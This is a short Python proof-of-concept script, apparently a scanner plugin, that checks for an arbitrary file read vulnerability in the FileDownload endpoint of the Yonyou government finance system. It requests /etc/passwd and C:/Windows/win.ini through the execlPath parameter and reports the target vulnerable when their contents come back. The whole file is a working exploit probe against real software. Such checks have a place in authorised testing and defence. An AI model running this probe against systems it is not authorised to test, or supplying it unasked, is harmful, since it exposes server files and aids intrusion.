import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友政务财务系统FileDownload存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Connection': 'keep-alive',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    vurl1 = urllib.parse.urljoin(url, "/bg/attach/FileDownload?execlPath=/etc/passwd")
    vurl2 = urllib.parse.urljoin(url, "/bg/attach/FileDownload?execlPath=C://Windows//win.ini")
    try:
        response = requests.get(vurl1, headers=headers)
        if response.status_code == 200 and 'root' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl1
            return relsult
        response = requests.get(vurl2, headers=headers)
        if response.status_code == 200 and '[fonts]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl2
        return relsult


    except:
        return relsult